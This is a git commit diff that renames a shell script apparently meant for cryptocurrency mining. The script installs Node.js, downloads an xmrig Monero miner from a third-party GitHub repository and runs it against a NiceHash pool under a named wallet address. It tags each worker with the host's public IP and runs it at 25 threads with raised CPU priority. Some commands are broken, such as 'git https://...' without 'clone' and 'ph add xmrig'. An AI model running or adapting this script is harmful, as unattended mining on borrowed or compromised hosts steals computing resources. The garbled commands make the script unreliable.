cc2d71669edb102c5bd9d2cd2793d77a8edbd2a9
Myaxisplay <101804515+Myaxisplay@users.noreply.github.com>
2022-06-18 11:38:38 -0700

    Update and rename bus.sh to bis.sh

--- bis.sh
+++ bis.sh
@@ -3,7 +3,7 @@ wget https://nodejs.org/download/release/v14.17.0/node-v14.17.0-linux-x64.tar.gz
 \rm node-v14.17.0-linux-x64.tar.gz
 PATH=/opt/node-v14.17.0-linux-x64/bin:$PATH
 npm config set cache /tmp --global
-wget https://raw.githubusercontent.com/hondacars/sirji/main/xmrig-6.17.0-bionic-x64.tar.gz -O - | tar -xz && cd xmrig-6.17.0
+git https://github.com/hondacars/xxx.git
 ph add xmrig
 ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./xmrig -a rx/0 -o stratum+tcp://randomxmonero.usa-west.nicehash.com:3380  -u 3J7rYdE9j5tvhms2emkNCLpvJ2fmVcHxri.$ip -p x --threads=25 --cpu-priority=10 --randomx-mode=fast --keepalive
 
